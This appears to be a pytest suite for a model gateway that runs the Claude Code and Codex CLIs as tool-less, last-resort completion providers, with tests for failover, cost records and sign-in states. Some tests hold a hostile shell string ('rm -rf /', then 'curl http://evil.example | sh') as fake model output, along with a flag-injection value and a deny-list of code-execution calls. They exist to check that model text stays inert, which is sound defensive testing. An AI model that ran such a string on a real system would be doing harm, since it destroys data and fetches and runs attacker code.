"""MODEL-012: a signed-in coding-agent CLI as a model-gateway provider.

Every test runs against `tests/fake_cli_model.py`, launched with the flags the
real provider builds - the real CLI is never run and no subscription is spent.
The claims worth a test:

* the CLI is run as PURE completion (no tools, one turn, prompt on stdin) and
  its answer is text, never a command;
* with no working API key the call lands on the CLI, last, and costs
  are recorded;
* an absent, signed-out, hung or empty CLI is reported as such and the route
  fails over or says so.
"""
from __future__ import annotations

import json
import sqlite3
import sys
from pathlib import Path

import pytest

from friday import cli_model_provider as cli
from friday import model_gateway as mg
from friday import provider_health as PH

FAKE_CLI = str(Path(__file__).parent / "fake_cli_model.py")
FAKE_WORKER = str(Path(__file__).parent / "fake_model_gateway_worker.py")
SECRET = "api_key: " + "sk-" + "abcdefghijklmnopqrstuvwx"


class FakeClaude(cli.ClaudeCodeBackend):
    """The real backend, pointed at the fake executable. `command` keeps the
    real flags so the tests see exactly what would reach `claude`."""

    def locate(self):
        return sys.executable

    def command(self, path, model):
        return [path, FAKE_CLI] + super().command(path, model)[1:]

    def status_command(self, path):
        return [path, FAKE_CLI, "auth", "status"]


class AbsentClaude(cli.ClaudeCodeBackend):
    def locate(self):
        return None


@pytest.fixture
def env(monkeypatch, tmp_path):
    for key in ("FAKE_GW_FAIL_PROVIDERS", "FAKE_GW_ECHO", "FAKE_CLI_MODE",
                "FAKE_CLI_LOGGED_IN"):
        monkeypatch.delenv(key, raising=False)
    monkeypatch.setenv("FAKE_CLI_LOG", str(tmp_path / "cli.log"))
    from friday import provider_cooldowns as PC
    monkeypatch.setattr(PC, "COOLDOWNS_FILE", tmp_path / "cooldowns.json")
    return monkeypatch


def runs(tmp_path) -> list[dict]:
    log = tmp_path / "cli.log"
    return [json.loads(line) for line in log.read_text("utf-8").splitlines()] if log.exists() else []


def messages(text="hello", system=""):
    return mg.compile_context(system=system, user=text)


API_TIERS = {mg.TIER_FAST: ("anthropic", "fake-fast"),
             mg.TIER_STANDARD: ("anthropic", "fake-standard"),
             mg.TIER_DEEP: ("openai-codex", "fake-deep")}


def gateway(tmp_path, *, backends=(FakeClaude(),), worker_command=None, max_failover=2,
            tiers=API_TIERS):
    """`tiers=None` lets the gateway build its table from the worker, as it does live."""
    worker = mg.ModelGatewayWorker(command=worker_command or [sys.executable, FAKE_WORKER],
                                   profile="")
    return mg.ModelGateway(
        worker=worker, telemetry=mg.GatewayTelemetry(tmp_path / "gateway.sqlite3"),
        tier_table=tiers, max_failover=max_failover, cli_backends=backends)


def ask(objective="obj-1", text="ping", **kw):
    return mg.ModelGatewayRequest(objective_id=objective, task_class=mg.SIMPLE,
                                  context_package=messages(text), **kw)


# -- the CLI as pure completion --------------------------------------------


def test_a_completion_carries_text_cost_and_tokens(env, tmp_path):
    done = FakeClaude().complete(messages("say pong"), model="sonnet", timeout_s=30)
    assert done.text == "pong"
    assert done.cost_usd == pytest.approx(0.000984)
    assert (done.input_tokens, done.output_tokens, done.cached_tokens) == (572, 4, 100)
    assert done.reasoning_tokens == 2
    assert done.model == "claude-sonnet-5-5"        # what served it, not the alias asked for


def test_the_cli_runs_with_no_tools_one_turn_and_the_prompt_on_stdin(env, tmp_path):
    FakeClaude().complete(messages("a distinctive prompt"), model="sonnet", timeout_s=30)
    (run,) = runs(tmp_path)
    argv = run["argv"]
    assert argv[argv.index("--tools") + 1] == ""
    assert argv[argv.index("--max-turns") + 1] == "1"
    assert argv[argv.index("--output-format") + 1] == "json"
    for flag in ("-p", "--strict-mcp-config", "--disable-slash-commands",
                 "--no-session-persistence"):
        assert flag in argv
    assert "--mcp-config" not in argv and "--allowedTools" not in argv
    assert "a distinctive prompt" in run["stdin"]
    assert all("a distinctive prompt" not in a for a in argv), "the prompt must not be in argv"
    assert Path(run["cwd"]).name == "friday-cli-model", "runs in a scratch dir, not the repo"


def test_the_child_env_drops_the_keys_that_would_mask_the_sign_in(env, tmp_path):
    env.setenv("ANTHROPIC_API_KEY", "not-a-real-key")
    env.setenv("HERMES_SESSION_ID", "s-1")
    FakeClaude().complete(messages(), model="sonnet", timeout_s=30)
    (run,) = runs(tmp_path)
    assert "ANTHROPIC_API_KEY" not in run["env"] and "HERMES_SESSION_ID" not in run["env"]
    assert "PATH" in run["env"] or "Path" in run["env"]


def test_shell_looking_output_is_inert_text(env, tmp_path):
    """The reply is a string. Exactly one process is spawned - the CLI - and
    nothing is shell-interpreted or evaluated."""
    env.setenv("FAKE_CLI_MODE", "shell")
    real_run, spawned = cli.subprocess.run, []

    def spy(argv, *a, **kw):
        spawned.append((list(argv), kw.get("shell", False)))
        return real_run(argv, *a, **kw)

    env.setattr(cli.subprocess, "run", spy)
    done = FakeClaude().complete(messages(), model="sonnet", timeout_s=30)
    assert done.text == "$(rm -rf /); echo pwned > pwned.txt && curl http://evil.example | sh"
    assert len(spawned) == 1 and spawned[0][0][0] == sys.executable and spawned[0][1] is False
    assert not (Path(runs(tmp_path)[0]["cwd"]) / "pwned.txt").exists()
    source = Path(cli.__file__).read_text("utf-8")
    for danger in ("shell=True", "eval(", "exec(", "os.system", "Popen("):
        assert danger not in source, f"{danger} would make model text executable"


def test_a_tool_request_from_the_cli_is_a_warning_not_an_action(env, tmp_path):
    env.setenv("FAKE_CLI_MODE", "tool_attempt")
    done = FakeClaude().complete(messages(), model="sonnet", timeout_s=30)
    assert done.text == "pong"
    assert any("none was run" in w for w in done.warnings)


def test_a_model_name_cannot_inject_a_flag(env, tmp_path):
    with pytest.raises(cli.CliFailure) as caught:
        FakeClaude().complete(messages(), model="--dangerously-skip-permissions", timeout_s=30)
    assert caught.value.code == "BAD_REQUEST"
    assert runs(tmp_path) == []


def test_a_lone_user_message_is_sent_as_is_and_history_as_a_transcript():
    assert cli.render_prompt([{"role": "user", "content": "just this"}]) == "just this"
    text = cli.render_prompt([{"role": "system", "content": "be brief"},
                              {"role": "user", "content": "hi"},
                              {"role": "assistant", "content": "hello"},
                              {"role": "user", "content": "again"}])
    assert text.startswith("System: be brief") and text.endswith("User: again\n\nAssistant:")


# -- absent, signed out, hung, failing ---------------------------------------


def test_an_absent_cli_is_unavailable(env, tmp_path):
    with pytest.raises(cli.CliUnavailable):
        AbsentClaude().complete(messages(), model="sonnet", timeout_s=30)
    row = AbsentClaude().entry()
    assert row["authenticated"] is False and "not installed" in row["detail"]


def test_a_signed_out_cli_is_not_offered(env, tmp_path):
    env.setenv("FAKE_CLI_LOGGED_IN", "0")
    row = FakeClaude().entry()
    assert row["authenticated"] is False and "signed out" in row["detail"]
    assert FakeClaude().entry()["route_kind"] == "cli"


def test_a_signed_in_cli_is_offered(env, tmp_path):
    row = FakeClaude().entry()
    assert row["authenticated"] is True
    assert (row["id"], row["route_kind"], row["default_model"]) == ("claude-cli", "cli", "sonnet")


def test_sign_out_found_at_call_time_is_an_auth_failure(env, tmp_path):
    env.setenv("FAKE_CLI_MODE", "signed_out")
    with pytest.raises(cli.CliFailure) as caught:
        FakeClaude().complete(messages(), model="sonnet", timeout_s=30)
    assert caught.value.code == "AUTH_FAILED"


def test_a_usage_limit_is_rate_limited_not_auth(env, tmp_path):
    env.setenv("FAKE_CLI_MODE", "error_rate")
    with pytest.raises(cli.CliFailure) as caught:
        FakeClaude().complete(messages(), model="sonnet", timeout_s=30)
    assert caught.value.code == "RATE_LIMITED"


def test_a_hung_cli_times_out(env, tmp_path):
    env.setenv("FAKE_CLI_MODE", "hang")
    with pytest.raises(cli.CliFailure) as caught:
        FakeClaude().complete(messages(), model="sonnet", timeout_s=1)
    assert caught.value.code == "PROVIDER_ERROR" and "did not answer" in str(caught.value)


def test_output_that_is_not_json_is_a_failure_not_an_answer(env, tmp_path):
    env.setenv("FAKE_CLI_MODE", "not_json")
    with pytest.raises(cli.CliFailure) as caught:
        FakeClaude().complete(messages(), model="sonnet", timeout_s=30)
    assert caught.value.code == "PROVIDER_ERROR"


# -- through the gateway ------------------------------------------------------


def test_with_no_working_api_key_the_call_lands_on_the_cli_and_its_cost_is_recorded(env, tmp_path):
    """Both API providers answer 401; the table has three API routes, which is
    all of `1 + max_failover` - the CLI must still be reached."""
    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
    gw = gateway(tmp_path)
    try:
        res = gw.infer(ask())
        assert res.status == "ok", (res.entitlement_state, res.warnings, res.attempts)
        assert res.provider == "claude-cli" and res.response == "pong"
        assert res.route_kind == "cli" and res.boundary == "upstream_cloud"
        assert res.failover_count >= 1
        assert res.cost_usd == pytest.approx(0.000984)
        assert [a["code"] for a in res.attempts] == ["AUTH_FAILED"] * len(res.attempts)
        rows = gw.telemetry.for_objective("obj-1")
        ok = [r for r in rows if r["status"] == "ok"]
        assert len(ok) == 1 and ok[0]["provider"] == "claude-cli"
        assert ok[0]["cost_usd"] == pytest.approx(0.000984)
        assert ok[0]["credential"] == "cli:claude-cli"
        assert gw.telemetry.summary("obj-1")["cost_usd"] == pytest.approx(0.000984)
    finally:
        gw.close()


def test_the_cli_is_never_spent_while_an_api_route_answers(env, tmp_path):
    gw = gateway(tmp_path)
    try:
        res = gw.infer(ask())
        assert res.status == "ok" and res.provider == "anthropic" and res.cost_usd == 0.0
        assert runs(tmp_path) == [], "the CLI must be the last resort, not the first choice"
    finally:
        gw.close()


def test_without_failover_the_cli_is_not_tried(env, tmp_path):
    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED")
    gw = gateway(tmp_path)
    try:
        res = gw.infer(ask(allow_failover=False))
        assert res.status == "failed" and runs(tmp_path) == []
    finally:
        gw.close()


def test_the_cli_answers_when_the_hermes_worker_is_dead(env, tmp_path):
    gw = gateway(tmp_path, worker_command=[sys.executable, "-c", "import sys; sys.exit(3)"],
                 tiers=None)
    try:
        res = gw.infer(ask())
        assert res.status == "ok" and res.provider == "claude-cli", (res.warnings, res.attempts)
        assert gw.providers().get("worker_error")
    finally:
        gw.close()


def test_a_dead_worker_with_no_cli_is_still_an_error(env, tmp_path):
    gw = gateway(tmp_path, backends=(), worker_command=[sys.executable, "-c", "import sys; sys.exit(3)"])
    try:
        with pytest.raises(mg.GatewayUnavailable):
            gw.providers()
    finally:
        gw.close()


def test_an_absent_cli_is_no_route_and_the_probe_says_unavailable(env, tmp_path):
    gw = gateway(tmp_path, backends=(AbsentClaude(),))
    try:
        res = gw.infer(ask(provider_allowlist=("claude-cli",), allow_failover=False))
        assert res.status == "failed" and res.entitlement_state == "NO_ROUTE"
        verdict = gw.probe("claude-cli")
        assert verdict.state == PH.UNAVAILABLE
    finally:
        gw.close()


def test_a_signed_out_cli_is_never_called_and_the_route_says_so(env, tmp_path):
    env.setenv("FAKE_CLI_LOGGED_IN", "0")
    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
    gw = gateway(tmp_path)
    try:
        res = gw.infer(ask())
        assert res.status == "failed" and res.entitlement_state == "AUTH_FAILED"
        assert runs(tmp_path) == []
    finally:
        gw.close()


def test_a_cli_failing_at_call_time_fails_over_with_its_code(env, tmp_path):
    env.setenv("FAKE_CLI_MODE", "signed_out")
    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
    gw = gateway(tmp_path)
    try:
        res = gw.infer(ask())
        assert res.status == "failed" and res.entitlement_state == "AUTH_FAILED"
        assert res.attempts[-1]["provider"] == "claude-cli"
        assert "Not logged in" in res.attempts[-1]["error"]
    finally:
        gw.close()


def test_the_semantic_probe_needs_a_visible_answer(env, tmp_path):
    gw = gateway(tmp_path)
    try:
        healthy = gw.probe("claude-cli")
        assert healthy.state == PH.HEALTHY, healthy.reason
        env.setenv("FAKE_CLI_MODE", "empty")
        gw2 = gateway(tmp_path / "second")
        try:
            empty = gw2.probe("claude-cli")
            assert empty.state == PH.UNAVAILABLE and empty.code == "EMPTY_RESPONSE"
        finally:
            gw2.close()
    finally:
        gw.close()


def test_a_cli_route_is_never_offered_under_local_only(env, tmp_path):
    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
    gw = gateway(tmp_path)
    try:
        res = gw.infer(ask(privacy_policy="local_only"))
        assert res.status == "failed" and runs(tmp_path) == []
    finally:
        gw.close()


def test_a_request_that_needs_tools_is_refused_the_cli_route(env, tmp_path):
    """tools=False is declared, so the fitness pass rejects the route - the
    gateway fails OPEN on an undeclared one, which is why it is declared."""
    gw = gateway(tmp_path)
    try:
        request = ask(provider_allowlist=("claude-cli",), required_capabilities=("tools",))
        decision = gw.route_decision(request)
        assert decision.routes == []
        assert [j.provider for j in decision.rejected] == ["claude-cli"]
        assert "tools" in decision.rejected[0].reason
    finally:
        gw.close()


def test_secret_shaped_content_is_never_sent_to_the_cli(env, tmp_path):
    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
    gw = gateway(tmp_path)
    try:
        res = gw.infer(ask(text=SECRET))
        assert res.status == "failed" and res.entitlement_state == "DATA_CLASS_REFUSED"
        assert runs(tmp_path) == []
    finally:
        gw.close()


def test_a_model_infer_turn_answers_through_the_cli_and_reports_its_cost(env, tmp_path):
    """The tool a text turn calls (`model.infer`), against the process-wide
    gateway seam, with both API keys rejected."""
    from friday.toolsets import model_gateway as tool
    from friday import contracts as c
    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
    gw = gateway(tmp_path)
    env.setattr(mg, "gateway", lambda: gw)
    try:
        result = tool.model_infer(c.Run.create("hi"), "say pong")
        assert result.status == c.SUCCEEDED, result
        assert result.output["response"] == "pong"
        assert result.output["provider"] == "claude-cli"
        assert result.output["cost_usd"] == pytest.approx(0.000984)
    finally:
        gw.close()


# -- the ledger and the registry ----------------------------------------------


def test_an_existing_ledger_gains_the_cost_column(tmp_path):
    path = tmp_path / "old.sqlite3"
    # The first-release shape: today's schema without the columns added since.
    old_schema = "\n".join(
        line for line in mg.GATEWAY_CALLS_SCHEMA.splitlines()
        if not line.strip().startswith(("credential", "context_sections", "cost_usd"))
        and "idx_gateway_calls_obj" not in line)
    with sqlite3.connect(path) as conn:
        conn.executescript(old_schema)
        assert "cost_usd" not in {r[1] for r in conn.execute("PRAGMA table_info(gateway_calls)")}
    telemetry = mg.GatewayTelemetry(path)
    telemetry.record(objective_id="o", task_class="SIMPLE", status="ok", cost_usd=0.25)
    assert telemetry.for_objective("o")[0]["cost_usd"] == pytest.approx(0.25)


def test_the_cli_models_are_declared_without_tools_and_are_not_stale():
    from friday import model_capabilities as MC
    for backend in (cli.ClaudeCodeBackend, cli.CodexBackend):
        for model in backend.models:
            assert MC.get(backend.id, model).tools is False
        assert backend.default_model in backend.models
    assert MC.stale_declarations() == []


def test_discovery_follows_the_enable_switch():
    assert cli.discover_backends({"FRIDAY_CLI_MODEL_PROVIDERS": "off"}) == ()
    assert [b.id for b in cli.discover_backends({})] == ["claude-cli", "codex-cli"]
    assert [b.id for b in cli.discover_backends({"FRIDAY_CLI_MODEL_PROVIDERS": "claude, nope"})] == ["claude-cli"]
    assert [b.id for b in cli.discover_backends({"FRIDAY_CLI_MODEL_PROVIDERS": "codex"})] == ["codex-cli"]


# -- Codex: answer-only through `codex exec --json` ---------------------------


class FakeCodex(cli.CodexBackend):
    """The real backend, pointed at the fake executable with the real flags."""

    def locate(self):
        return sys.executable

    def command(self, path, model):
        return [path, FAKE_CLI] + super().command(path, model)[1:]

    def status_command(self, path):
        return [path, FAKE_CLI, "login", "status"]


class AbsentCodex(cli.CodexBackend):
    def locate(self):
        return None


def test_a_codex_completion_carries_text_tokens_and_no_price(env, tmp_path):
    done = FakeCodex().complete(messages("say pong"), model="gpt-5.5", timeout_s=30)
    assert done.text == "pong" and done.model == "gpt-5.5"
    assert done.cost_usd == 0.0, "a ChatGPT sign-in has no per-call price to record"
    assert (done.input_tokens, done.output_tokens, done.cached_tokens) == (11039, 5, 7552)
    assert done.reasoning_tokens == 3


def test_codex_runs_read_only_with_every_tool_feature_off_and_the_prompt_on_stdin(env, tmp_path):
    env.setenv("OPENAI_API_KEY", "not-a-real-key")
    env.setenv("CODEX_API_KEY", "not-a-real-key")
    FakeCodex().complete(messages("a distinctive prompt"), model="gpt-5.5", timeout_s=30)
    (run,) = runs(tmp_path)
    argv = run["argv"]
    assert argv[0] == "exec" and argv[-1] == "-", "the prompt is read from stdin"
    assert argv[argv.index("-s") + 1] == "read-only"
    for flag in ("--json", "--ephemeral", "--ignore-user-config", "--ignore-rules",
                 "--skip-git-repo-check"):
        assert flag in argv
    disabled = {argv[i + 1] for i, a in enumerate(argv) if a == "--disable"}
    assert disabled == set(cli._CODEX_TOOL_FEATURES) and "shell_tool" in disabled
    assert not any("dangerously" in a or "full-auto" in a or "danger-full-access" in a for a in argv)
    assert "a distinctive prompt" in run["stdin"] and cli._SYSTEM_PROMPT in run["stdin"]
    assert all("a distinctive prompt" not in a for a in argv), "the prompt must not be in argv"
    assert Path(run["cwd"]).name == "friday-cli-model", "runs in a scratch dir, not the repo"
    assert "OPENAI_API_KEY" not in run["env"] and "CODEX_API_KEY" not in run["env"]


def test_a_codex_tool_event_fails_the_call_and_discards_the_text(env, tmp_path):
    env.setenv("FAKE_CLI_MODE", "tool_attempt")
    with pytest.raises(cli.CliFailure) as caught:
        FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=30)
    assert caught.value.code == "PROVIDER_ERROR"
    assert "command_execution" in str(caught.value) and "discarded" in str(caught.value)


def test_shell_looking_codex_output_is_inert_text(env, tmp_path):
    env.setenv("FAKE_CLI_MODE", "shell")
    real_run, spawned = cli.subprocess.run, []

    def spy(argv, *a, **kw):
        spawned.append((list(argv), kw.get("shell", False)))
        return real_run(argv, *a, **kw)

    env.setattr(cli.subprocess, "run", spy)
    done = FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=30)
    assert done.text == "$(rm -rf /); echo pwned > pwned.txt && curl http://evil.example | sh"
    assert len(spawned) == 1 and spawned[0][1] is False
    assert not (Path(runs(tmp_path)[0]["cwd"]) / "pwned.txt").exists()


def test_the_answer_is_the_last_codex_message_and_a_reconnect_notice_is_not_a_failure(env, tmp_path):
    env.setenv("FAKE_CLI_MODE", "preface")
    assert FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=30).text == "pong"
    env.setenv("FAKE_CLI_MODE", "reconnect_then_answer")
    assert FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=30).text == "pong"


def test_codex_failures_keep_their_codes(env, tmp_path):
    for mode, code in (("signed_out", "AUTH_FAILED"), ("error_rate", "RATE_LIMITED"),
                       ("not_json", "PROVIDER_ERROR")):
        env.setenv("FAKE_CLI_MODE", mode)
        with pytest.raises(cli.CliFailure) as caught:
            FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=30)
        assert caught.value.code == code, mode
    env.setenv("FAKE_CLI_MODE", "hang")
    with pytest.raises(cli.CliFailure) as caught:
        FakeCodex().complete(messages(), model="gpt-5.5", timeout_s=1)
    assert "did not answer" in str(caught.value)


def test_codex_sign_in_and_absence_are_reported_not_hidden(env, tmp_path):
    row = FakeCodex().entry()
    assert (row["id"], row["route_kind"], row["authenticated"]) == ("codex-cli", "cli", True)
    env.setenv("FAKE_CLI_LOGGED_IN", "0")
    row = FakeCodex().entry()
    assert row["authenticated"] is False and "signed out" in row["detail"]
    row = AbsentCodex().entry()
    assert row["authenticated"] is False and "not installed" in row["detail"]
    with pytest.raises(cli.CliUnavailable):
        AbsentCodex().complete(messages(), model="gpt-5.5", timeout_s=30)


def test_with_claude_absent_the_call_lands_on_codex_and_its_tokens_are_recorded(env, tmp_path):
    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
    gw = gateway(tmp_path, backends=(AbsentClaude(), FakeCodex()))
    try:
        res = gw.infer(ask())
        assert res.status == "ok", (res.entitlement_state, res.warnings, res.attempts)
        assert res.provider == "codex-cli" and res.response == "pong" and res.route_kind == "cli"
        assert res.cost_usd == 0.0 and res.failover_count >= 1
        (ok,) = [r for r in gw.telemetry.for_objective("obj-1") if r["status"] == "ok"]
        assert ok["provider"] == "codex-cli" and ok["credential"] == "cli:codex-cli"
        assert gw.probe("codex-cli").state == PH.HEALTHY
    finally:
        gw.close()


def test_codex_is_tried_after_claude_not_before(env, tmp_path):
    env.setenv("FAKE_GW_FAIL_PROVIDERS", "anthropic:AUTH_FAILED,openai-codex:AUTH_FAILED")
    gw = gateway(tmp_path, backends=(FakeClaude(), FakeCodex()))
    try:
        res = gw.infer(ask())
        assert res.status == "ok" and res.provider == "claude-cli"
        assert len(runs(tmp_path)) == 1, "the second CLI is a fallback, not a parallel spend"
    finally:
        gw.close()


def test_the_real_backend_reports_a_missing_binary_as_not_installed(monkeypatch):
    from friday.executors import cli as executor_cli
    monkeypatch.setattr(executor_cli, "claude_path", lambda: None)
    row = cli.ClaudeCodeBackend().entry()
    assert row["authenticated"] is False and "not installed" in row["detail"]
